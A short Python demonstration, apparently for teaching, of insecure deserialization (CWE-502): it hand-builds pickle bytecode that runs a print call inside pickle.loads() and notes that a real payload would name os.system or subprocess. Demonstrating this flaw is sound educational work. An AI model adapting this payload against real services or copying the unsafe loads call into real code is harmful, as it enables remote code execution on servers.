import pickle

# What the attacker sends. It is hand-built pickle bytecode: "import builtins.print and call it
# with this argument". The attacker needs NO class from the server; a real payload would name
# os.system or subprocess instead of print.
attacker_blob = b"cbuiltins\nprint\n(S'  >>> code chosen by the attacker is running inside pickle.loads()'\ntR."

print("[demo] the server restores a 'saved session' sent back by the client...")
session = pickle.loads(attacker_blob)   # VULNERABLE (CWE-502): deserializing untrusted bytes
print("\n[ATTACK SUCCEEDED] merely loading the data executed attacker-chosen code, before any")
print("                   application logic could inspect or reject the 'session'.")
